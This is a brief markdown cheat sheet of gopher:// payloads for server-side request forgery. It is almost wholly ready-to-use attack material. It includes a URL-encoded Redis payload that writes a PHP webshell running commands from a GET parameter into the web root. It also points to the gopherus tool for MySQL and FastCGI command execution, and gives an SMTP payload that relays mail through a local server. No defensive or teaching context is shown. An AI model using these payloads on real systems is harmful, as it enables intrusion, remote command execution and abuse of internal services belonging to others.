# Gopher Protocol Payloads

## Format
`gopher://<host>:<port>/_<url-encoded-data>`

First character after `_` is consumed as a filler. Use `_` or any char.
Line endings must be `%0d%0a` (CRLF).

## Redis — Write Webshell
```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22<%3fphp%20system($_GET['c'])%3b%3f>%22%0d%0aSAVE%0d%0a
```

## MySQL — Unauthenticated Query
Use `gopherus --exploit mysql` to generate binary protocol payload.

## FastCGI — Command Execution
Use `gopherus --exploit fastcgi` with target PHP file path.

## SMTP — Send Email
```
gopher://127.0.0.1:25/_HELO%20evil.com%0d%0aMAIL%20FROM:<a@a.com>%0d%0aRCPT%20TO:<target@target.com>%0d%0aDATA%0d%0aSubject:%20test%0d%0a%0d%0aSSRF%20test%0d%0a.%0d%0aQUIT
```
